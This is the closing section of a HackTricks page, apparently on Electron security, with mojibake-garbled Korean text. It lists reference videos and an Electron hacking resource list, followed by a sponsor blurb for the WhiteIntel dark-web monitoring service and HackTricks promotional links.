* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* Electron ë³´ì•ˆì— ëŒ€í•œ ì¶”ê°€ ì—°êµ¬ ë° ê¸°ê³ ëŠ” [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)ì€ **ë‹¤í¬ ì›¹**ì„ í™œìš©í•œ ê²€ìƒ‰ ì—”ì§„ìœ¼ë¡œ, íšŒì‚¬ë‚˜ ê³ ê°ì´ **stealer malwares**ì— ì˜í•´ **ì¹¨í•´**ë‹¹í–ˆëŠ”ì§€ ë¬´ë£Œ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

WhiteIntelì˜ ì£¼ìš” ëª©í‘œëŠ” ì •ë³´ë¥¼ ë„ë‚œí•˜ëŠ” ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´ë¡œ ì¸í•œ ê³„ì • íƒˆì·¨ ë° ëœì„¬ì›¨ì–´ ê³µê²©ì„ ë§‰ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê·¸ë“¤ì˜ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸í•˜ì—¬ ì—”ì§„ì„ **ë¬´ë£Œ**ë¡œ ì‚¬ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>ì œë¡œë¶€í„° AWS í•´í‚¹ì„ ì „ë¬¸ê°€ë¡œ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ì™€ í•¨ê»˜!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **HackTricksì— ê·€ì‚¬ë¥¼ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ì…í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [ë””ìŠ¤ì½”ë“œ ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks ë° HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
